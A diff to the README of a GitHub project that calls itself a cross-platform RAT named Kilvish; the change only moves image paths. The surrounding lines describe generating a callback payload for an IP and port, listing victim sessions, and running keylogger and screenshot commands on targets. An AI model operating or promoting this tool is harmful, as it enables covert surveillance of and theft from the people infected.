@@ -1,5 +1,5 @@
 <h1 align="center"> 
-    <img src="https://github.com/siddhant385/Kilvish/blob/master/resources/kilvish.jpg" alt="KILVISH" /> <br>    
+    <img src="https://github.com/siddhant385/Kilvish/blob/master/.github/kilvish.jpg" alt="KILVISH" /> <br>    
     KILVISH
 </h1>
 <p align="center">
@@ -10,7 +10,7 @@
 </p>
 <h4 align="center"> A Cross Platform multifunctional (Windows/Linux/Mac) RAT.</h4>
 
-<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/resources/1.png"></h6>
+<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/.github/1.png"></h6>
 
 ## Getting Started
 ### Description
@@ -68,7 +68,7 @@ The compiled version has to generated on the respective platform. For example, y
 $ python3 server.py generate --address 134.276.92.1 --port 2999 --output /tmp/filer
 ```
 
-<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/resources/2.png"></h6>
+<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/.github/2.png"></h6>
 
 Replace your IP Address and Port on above commands. 
 
@@ -84,7 +84,7 @@ All the connections will be listed under **sessions** command:
 $ sessions
 ```
 
-<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/resources/3.png"></h6>
+<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/.github/3.png"></h6>
 
 You can connect to you target session with **connect** command and launch one of available commands: 
 ```
@@ -94,7 +94,7 @@ $ keylogger dump
 $ screenshot
 ```
 
-<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/resources/4.png"></h6>
+<h6 align="center"><img src="https://github.com/siddhant385/Kilvish/blob/master/.github/4.png"></h6>
 
 ### Help
 Get a list of available commands: 
